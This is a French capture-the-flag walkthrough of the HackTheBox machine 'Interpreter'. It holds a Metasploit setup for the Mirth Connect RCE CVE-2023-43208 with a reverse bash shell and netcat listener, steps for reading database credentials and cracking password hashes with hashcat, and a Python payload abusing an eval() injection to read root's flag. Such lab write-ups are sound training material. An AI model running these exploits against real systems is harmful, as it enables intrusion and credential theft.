  # Interpreter

	echo "10.129.2.227 interpreter.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.2.227 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.2.227 -oN nmap.txt
	
Scans classiques.      
Résultats :

    PORT      STATE    SERVICE   REASON         VERSION
    22/tcp    open     ssh       syn-ack ttl 62 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
    80/tcp    open     http      syn-ack ttl 62
    443/tcp   open     ssl/https syn-ack ttl 62
    3844/tcp  filtered rnm       no-response
    4966/tcp  filtered unknown   no-response
    6661/tcp  open     unknown   syn-ack ttl 62

Site simple avec une interface Mirth Connect qui permet de télécharger un client et de se connecter. Un CVE de 2023 existe pour Mirth Connect : 
- https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT
- https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc/blob/master/CVE-2023-43208.py

Ou en passant par le module Metasploit : 

```
use multi/http/mirth_connect_cve_2023_43208
set payload cmd/unix/reverse_bash
set RHOSTS interpreter.htb
set RPORT 443
set LHOST 10.10.16.132
set LPORT 9999
run
```


Réception : 

```
nc -nvlp 9999
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Pivoting

On voit un utilisateur sedric dans /home/ mais impossible de lire dedans.

En revanche le fichier /usr/local/mirthconnect/conf/mirth.properties contient des credentials pour la base de données : 

    cat /usr/local/mirthconnect/conf/mirth.properties
    mysql -u mirthdb -p
    MariaDB [(none)]> SHOW DATABASES;
    MariaDB [(none)]> USE mc_bdd_prod;
    MariaDB [mc_bdd_prod]> SHOW TABLES;
    MariaDB [mc_bdd_prod]> SELECT * FROM PERSON;
    MariaDB [mc_bdd_prod]> SELECT * FROM PERSON_PASSWORD;
    
D'après la documentation et le code, il y a un salt de 8 caractères : 
- https://github.com/nextgenhealthcare/connect/blob/development/core-util/src/com/mirth/commons/encryption/Digester.java

Procédure pour casser : 

```
DECODED=$(echo "$HASH" | base64 -d | xxd -p | tr -d '\n')
salt=$(echo $DECODED | cut -c1-16 | xxd -r -p | base64) 
hash=$(echo $DECODED | cut -c17- | xxd -r -p | base64)
echo sha256:600000:$salt:$hash > hash 
hashcat -a 0 -m 10900 hash ./rockyou.txt
```

On a bien le mot de passe :

    ssh sedric@interpreter.htb
    cat user.txt
    
## Élévation de privilèges


On voit un service qui prend du XML sur le port 54321 : 

    ss -tulpn
    nc 127.0.0.1 54321

Ce service semble connecté à un serveur Flask dont on peut lire le code grâce à ce nouvel utilisateur : 

    cat /usr/local/bin/notif.py

On voit la route "/addPatient" en local : 

```
@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
```

Et également que les données sont passées à un eval() avec un filtre quasiment inexistant autorisant les accolades :

```
[...]
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
[...]
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
[...]
```

Exploit pour directement lire le flag : 

```
import urllib.request

data = """
<patient>
    <timestamp>1</timestamp>
    <sender_app>POC</sender_app>
    <id>3</id>
    <firstname>{open('/root/root.txt').read()}</firstname>
    <lastname>TEST</lastname>
    <birth_date>11/11/2011</birth_date>
    <gender>M</gender>
</patient>
"""
req = urllib.request.Request(
    url="http://127.0.0.1:54321/addPatient",
    data=data.encode(),
    headers={
        "Content-Type": "application/xml"
    }
)

with urllib.request.urlopen(req) as resp:
    print(resp.read().decode())
```
